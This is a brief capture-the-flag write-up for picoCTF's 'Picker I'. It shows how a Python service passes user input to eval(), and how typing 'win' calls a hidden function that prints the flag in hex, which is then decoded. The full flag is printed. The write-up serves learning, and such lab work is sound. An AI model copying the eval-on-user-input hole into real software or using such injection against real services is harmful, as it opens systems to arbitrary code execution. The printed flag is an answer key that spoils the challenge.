#Challenge: Picker I

#Objective
Find the flag using the provided service that produces random numbers. (It may do something else)

#Solution Steps
1. Launched instance of challenge
2. Downloaded all necessary files
    wget https://artifacts.picoctf.net/c/515/picker-I.py
3. Checked contents of directory 
    ls
4. Checked contents of file
    nano picker-I.py
5. Found function that would output flag
    def win():
        # This line will not work locally unless you create your own 'flag.txt' in
        #   the same directory as this script
        flag = open('flag.txt', 'r').read()
        #flag = flag[:-1]
        flag = flag.strip()
        str_flag = ''
        for c in flag:
            str_flag += str(hex(ord(c))) + ' '
        print(str_flag)
6. Found eval function inside user input
    try:
        print('Try entering "getRandomNumber" without the double quotes...')
        user_input = input('==> ')
        eval(user_input + '()')
6. Connected to program instance
    nc saturn.picoctf.net 62801
7. Prompted user input, tried flag function
    win
8. Outputted hexadecimal string, pasted string into cyberchef
    0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
9. Placed From Hex into Recipe portion and set Delimiter to Auto; extracted flag from output
    flag: picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}

#Learned
How to exploit eval function to run other functions inside source code